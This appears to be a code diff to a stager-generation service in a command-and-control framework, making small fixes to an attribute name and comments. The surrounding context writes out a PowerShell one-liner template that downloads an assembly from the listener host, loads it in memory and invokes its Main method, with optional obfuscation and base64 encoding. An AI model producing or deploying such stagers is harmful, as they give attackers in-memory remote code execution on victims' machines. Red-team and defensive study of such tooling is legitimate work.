@@ -188,7 +188,7 @@ class StagerGenerationService:
         self, language, obfuscate, obfuscation_command, encode, listener_name
     ):
         """
-        Generate a oneliner for a executable
+        Generate an oneliner for an executable
         """
         listener = self.listener_service.get_active_listener_by_name(listener_name)
 
@@ -196,14 +196,13 @@ class StagerGenerationService:
             hop = listener.options["Name"]["Value"]
             while getattr(listener, "parent_listener", None) is not None:
                 listener = self.listener_service.get_active_listener_by_name(
-                    listener.parent_listener.name
+                    listener.parent_listener_name
                 )
         else:
             hop = ""
         host = listener.options["Host"]["Value"]
         launcher_front = listener.options["Launcher"]["Value"]
 
-        # Encoded launcher requires a sleep
         launcher = f"""
         $wc=New-Object System.Net.WebClient;
         $bytes=$wc.DownloadData("{host}/download/{language}/{hop}");
@@ -211,7 +210,6 @@ class StagerGenerationService:
         $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);
         """
 
-        # Remove comments and make one line
         launcher = helpers.strip_powershell_comments(launcher)
         launcher = data_util.ps_convert_to_oneliner(launcher)
 
@@ -220,12 +218,10 @@ class StagerGenerationService:
                 launcher,
                 obfuscation_command=obfuscation_command,
             )
-        # base64 encode the stager and return it
         if encode and (
             (not obfuscate) or ("launcher" not in obfuscation_command.lower())
         ):
             return helpers.powershell_launcher(launcher, launcher_front)
-        # otherwise return the case-randomized stager
         return launcher
 
     def generate_go_exe_oneliner(
